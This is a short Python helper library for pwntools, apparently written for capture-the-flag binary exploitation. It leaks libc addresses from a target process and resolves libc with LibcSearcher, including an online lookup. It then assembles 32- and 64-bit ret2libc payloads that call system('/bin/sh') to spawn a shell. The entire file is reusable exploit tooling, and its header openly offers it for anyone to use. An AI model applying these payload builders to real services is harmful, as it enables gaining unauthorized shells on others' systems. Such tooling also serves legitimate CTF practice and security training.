"""
@author: RedLeaves
@date: 2023-4-24
Pwntools-Extern Functions
开源包，任何人都可以使用并修改！
"""

from LibcSearcher import *
from pwn import *

__version__ = '1.2'

def leak_addr(i, io_i):
    if i == 0:
        address_internal = u32(io_i.recv(4))
        return address_internal
    if i == 1:
        address_internal = u64(io_i.recvuntil(b'\x7f')[:6].ljust(8, b'\x00'))
        return address_internal
    if i == 2:
        address_internal = u64(io_i.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
        return address_internal


def libc_remastered(func, addr_i):
    libc_i = LibcSearcher(func, addr_i)
    libc_base_i = addr_i - libc_i.dump(func)
    sys_i = libc_base_i + libc_i.dump('system')
    sh_i = libc_base_i + libc_i.dump('str_bin_sh')
    return libc_base_i, sys_i, sh_i


def libc_remastered_ol(func, addr_i):
    libc_i = LibcSearcher(func, addr_i, online=True)
    libc_base_i = addr_i - libc_i.dump(func)
    sys_i = libc_base_i + libc_i.dump('system')
    sh_i = libc_base_i + libc_i.dump('str_bin_sh')
    return libc_base_i, sys_i, sh_i


def Payload_32(Padding_I, system_i, arg, sh_i):
    payload_I = Padding_I + p32(system_i) + p32(arg) + p32(sh_i)
    return payload_I


def Payload_64(padding_I, system_i, sh_i, rdi_i, ret_i):
    payload_I = padding_I + p64(ret_i) + p64(rdi_i) + p64(sh_i) + p64(system_i)
    return payload_I


def Payload_32_Direct(padding_I, system_i, sh_i):
    payload_I = padding_I + p32(system_i) + p32(sh_i)
    return payload_I


def Payload_64_Direct(padding_I, system_i, sh_i, ret_i):
    payload_I = padding_I + p64(ret_i) + p64(sh_i) + p64(system_i)
    return payload_I


def debug(io):
    gdb.attach(io)
    pause()


def get_int_addr(io, num):
    return int(io.recv(num), 16)